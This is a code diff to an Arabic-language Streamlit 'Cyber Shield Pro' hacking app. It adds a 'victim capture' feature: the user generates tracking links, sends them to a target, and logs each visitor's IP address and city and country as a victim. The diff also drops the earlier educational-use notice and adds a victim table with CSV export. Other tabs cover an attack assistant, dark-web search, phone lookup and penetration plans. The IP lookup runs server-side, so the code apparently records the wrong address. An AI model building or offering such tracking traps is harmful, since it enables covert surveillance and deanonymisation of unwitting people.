@@ -5,6 +5,9 @@ import json
 from dotenv import load_dotenv
 from PIL import Image
 import base64
+import requests
+from urllib.parse import urlparse, parse_qs
+from datetime import datetime
 
 # استيراد الوحدات المحلية
 import config
@@ -27,6 +30,7 @@ import ai_analysis
 import report_generator
 import telegram_bot
 import location_tracker
+import victim_logger
 
 from ai_hacking import AIHackingAssistant
 from ai_chat import AIChatAssistant
@@ -41,6 +45,50 @@ if os.path.exists(logo_path):
     st.set_page_config(page_title="سايبر شيلد برو", layout="wide", page_icon=logo_img)
 else:
     st.set_page_config(page_title="سايبر شيلد برو", layout="wide", page_icon="🛡️")
+
+# ============= نظام التقاط بيانات الضحايا (Victim Capture) =============
+def capture_victim_data():
+    """التقاط بيانات الضحية عند فتح رابط التتبع"""
+    query_params = st.query_params
+    
+    if 'target' in query_params:
+        try:
+            # الحصول على عنوان IP الحقيقي للزائر
+            ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
+            if ip_response.status_code == 200:
+                user_ip = ip_response.json().get('ip', 'Unknown')
+            else:
+                user_ip = 'Unknown'
+            
+            # الحصول على معلومات المتصفح والجهاز
+            user_agent = st.session_state.get('user_agent', 'Unknown')
+            
+            # الحصول على معلومات الموقع الجغرافي
+            try:
+                geo_response = requests.get(f'https://ip-api.com/json/{user_ip}?lang=ar', timeout=5)
+                if geo_response.status_code == 200:
+                    geo_data = geo_response.json()
+                else:
+                    geo_data = None
+            except:
+                geo_data = None
+            
+            # تسجيل بيانات الضحية
+            victim_logger.log_victim_data(
+                ip_address=user_ip,
+                user_agent=user_agent,
+                referrer=query_params.get('target', 'Unknown'),
+                geo_data=geo_data
+            )
+            
+            # إعادة توجيه أو عرض صورة وهمية
+            st.session_state['victim_captured'] = True
+            
+        except Exception as e:
+            pass
+
+# استدعاء دالة التقاط البيانات
+capture_victim_data()
 
 # ============= نظام تسجيل الدخول =============
 def login_page():
@@ -203,6 +251,11 @@ with st.sidebar:
     
     if config.get_key("TAVILY_API_KEY"): st.success("✅ محرك البحث: متصل")
     else: st.warning("⚠️ محرك البحث: غير متصل")
+    
+    # عداد الضحايا المكتشفين
+    st.divider()
+    victims = victim_logger.get_victims_data()
+    st.metric("🎯 الضحايا المكتشفين", len(victims))
 
 st.title("🛡️ سايبر شيلد برو")
 st.markdown("<p style='text-align: center;'><code>>> تم تهيئة النظام بنجاح... تم منح الوصول...</code></p>", unsafe_allow_html=True)
@@ -303,7 +356,7 @@ with tabs[4]:
                                 # تحميل النتائج كـ CSV
                                 csv = df.to_csv(index=False, encoding='utf-8-sig')
                                 st.download_button(
-                                    label="تحميل النتائج (CSV)",
+                                    label="📥 تحميل النتائج (CSV)",
                                     data=csv,
                                     file_name="ip_geolocation_results.csv",
                                     mime="text/csv"
@@ -327,41 +380,99 @@ with tabs[4]:
 
 # 5. مصيدة IP (IP Logger)
 with tabs[5]:
-    st.subheader("🎣 مصيدة الـ IP - الحصول على IP من خلال الصور")
+    st.subheader("🎣 مصيدة الـ IP - توليد روابط تتبع مباشرة")
+    
     col1, col2 = st.columns(2)
+    
     with col1:
-        st.markdown("### كيف تعمل مصيدة الـ IP: عندما يفتح الشخص رابط الصورة التي ترسلها له، يتم تسجيل عنوان IP الخاص به.")
-        st.info("🚨 **تنبيه**: هذه الأداة للاستخدام التعليمي والأمني فقط.")
+        st.markdown("### 📋 كيفية الاستخدام:")
+        st.markdown("""
+        1. **أدخل اسماً للمصيدة** (مثلاً: "صورة مهمة")
+        2. **انسخ الرابط** الذي سيظهر
+        3. **أرسل الرابط** للهدف (عبر البريد، الرسائل، إلخ)
+        4. **راقب النتائج** - سيظهر هنا فوراً عند فتح الهدف للرابط
+        """)
+        
+        trap_name = st.text_input("🏷️ اسم المصيدة", placeholder="مثال: صورة مهمة")
+        
+        if st.button("🔗 توليد رابط التتبع"):
+            if trap_name:
+                # توليد رابط التتبع
+                app_url = "https://rashdai.streamlit.app"
+                trap_link = f"{app_url}/?target={trap_name}"
+                
+                st.success("✅ تم توليد الرابط بنجاح!")
+                st.code(trap_link, language="text")
+                st.info("📌 انسخ هذا الرابط وأرسله للهدف")
+            else:
+                st.warning("⚠️ يرجى إدخال اسم للمصيدة")
+    
     with col2:
-        st.markdown("### خدمات التتبع: [Grabify](https://grabify.link/) | [IPLogger](https://iplogger.org/) | [Bit.ly](https://bitly.com/)")
+        st.markdown("### 📊 سجل الضحايا المكتشفين:")
+        
+        victims = victim_logger.get_victims_data()
+        
+        if victims:
+            import pandas as pd
+            
+            # تحويل البيانات لجدول
+            victims_display = []
+            for victim in victims:
+                victims_display.append({
+                    "⏰ الوقت": victim.get('timestamp', 'Unknown'),
+                    "🌐 عنوان IP": victim.get('ip_address', 'Unknown'),
+                    "🗺️ الدولة": victim.get('geo_data', {}).get('country', 'Unknown') if victim.get('geo_data') else 'Unknown',
+                    "🏙️ المدينة": victim.get('geo_data', {}).get('city', 'Unknown') if victim.get('geo_data') else 'Unknown',
+                    "🎯 المصيدة": victim.get('referrer', 'Unknown')
+                })
+            
+            df_victims = pd.DataFrame(victims_display)
+            st.dataframe(df_victims, use_container_width=True)
+            
+            # زر التحميل
+            csv = df_victims.to_csv(index=False, encoding='utf-8-sig')
+            st.download_button(
+                label="📥 تحميل سجل الضحايا (CSV)",
+                data=csv,
+                file_name="victims_log.csv",
+                mime="text/csv"
+            )
+            
+            # زر التنظيف
+            if st.button("🗑️ مسح السجل"):
+                victim_logger.save_victims([])
+                st.success("✅ تم مسح السجل")
+                st.rerun()
+        else:
+            st.info("📭 لا توجد ضحايا مكتشفة حتى الآن")
 
-# 5. سطح الهجوم
-with tabs[5]:
+# 6. سطح الهجوم
+with tabs[6]:
     if "subs" in st.session_state:
         st.image(attack_surface.draw_graph(st.session_state.get("domain"), st.session_state["subs"]))
     else: st.info("يرجى تحليل الدومين أولاً")
 
-# 6. التحليل الذكي
-with tabs[6]:
+# 7. التحليل الذكي
+with tabs[7]:
     if "subs" in st.session_state:
         st.markdown(ai_analysis.analyze_ports(st.session_state.get("domain"), list(st.session_state["subs"].values())))
     else: st.info("يرجى تحليل الدومين أولاً")
 
-# 7. مساعد الهجوم
-with tabs[7]:
+# 8. مساعد الهجوم
+with tabs[8]:
     t = st.text_input("الهدف", key="ai_t_v5")
     p = st.text_input("المنافذ المفتوحة", key="ai_p_v5")
     if st.button("تحليل الهدف بالذكاء الاصطناعي"):
         st.markdown(AIHackingAssistant().analyze_target(t, p, ""))
 
-# 8. جوجل دورك
-with tabs[8]:
+# 9. جوجل دورك
+with tabs[9]:
     dq = st.text_input("Dork Query", key="dq_in_v5")
     if st.button("بحث جوجل دورك"):
         st.write(google_dork.search_dork(dq))
 
-# 9. تسريبات الإيميل
-with tabs[9]:
+# 10. تسريبات الإيميل
+with tabs[10]:
     em = st.text_input("البريد الإلكتروني", key="em_in_v5")
     if st.button("فحص تسريبات الإيميل"):
         with st.spinner("جاري البحث في قواعد بيانات التسريبات..."):
@@ -369,8 +480,8 @@ with tabs[9]:
             st.markdown(f"### 📧 نتيجة فحص التسريبات لـ {em}")
             st.markdown(res)
 
-# 10. بحث الهاتف
-with tabs[10]:
+# 11. بحث الهاتف
+with tabs[11]:
     ph = st.text_input("رقم الهاتف", key="ph_in_v5")
     if st.button("بحث عن رقم الهاتف"):
         with st.spinner("جاري البحث العميق عن معلومات الرقم والحسابات المرتبطة..."):
@@ -378,28 +489,28 @@ with tabs[10]:
             st.markdown(f"### 📱 نتيجة البحث عن الرقم {ph}")
             st.markdown(res)
 
-# 11. الدارك ويب
-with tabs[11]:
+# 12. الدارك ويب
+with tabs[12]:
     dq_dark = st.text_input("كلمة مفتاحية للبحث", key="dk_in_v5")
     if st.button("بحث في الدارك ويب"):
         with st.spinner("جاري البحث في أرشيفات الدارك ويب..."):
             res = darkweb_search.darkweb_lookup(dq_dark)
             st.markdown(res)
 
-# 12. المنافذ
-with tabs[12]:
+# 13. المنافذ
+with tabs[13]:
     pt = st.text_input("IP للفحص", key="pt_in_v5")
     if st.button("فحص المنافذ"):
         st.markdown(port_scanner.scan_ports(pt))
 
-# 13. الثغرات
-with tabs[13]:
+# 14. الثغرات
+with tabs[14]:
     vt = st.text_input("الهدف للفحص", key="vt_in_v5")
     if st.button("فحص الثغرات"):
         st.write(vuln_scanner.scan_vulnerabilities(vt))
 
-# 14. خريطة الشبكة
-with tabs[14]:
+# 15. خريطة الشبكة
+with tabs[15]:
     nt = st.text_input("الهدف للرسم", key="nt_in_v5")
     if st.button("رسم خريطة الشبكة"):
         network_map_result = network_mapper.map_network(nt, st.session_state.get("subs", {}))
@@ -408,20 +519,20 @@ with tabs[14]:
         else:
             st.image(network_map_result)
 
-# 15. التهديدات
-with tabs[15]:
+# 16. التهديدات
+with tabs[16]:
     tt = st.text_input("الهدف للتحليل", key="tt_in_v5")
     if st.button("تحليل التهديدات"):
         st.markdown(ai_threat.analyze_threat(tt))
 
-# 16. خطة الاختراق
-with tabs[16]:
+# 17. خطة الاختراق
+with tabs[17]:
     pt_plan = st.text_input("الهدف للخطة", key="pt_plan_v5")
     if st.button("توليد خطة الاختراق"):
         st.markdown(ai_pentest.pentest_advice(pt_plan, [], ""))
 
-# 17. التقارير
-with tabs[17]:
+# 18. التقارير
+with tabs[18]:
     if st.button("توليد تقرير PDF نهائي"):
         if "domain" in st.session_state:
             path = report_generator.create_report(st.session_state)
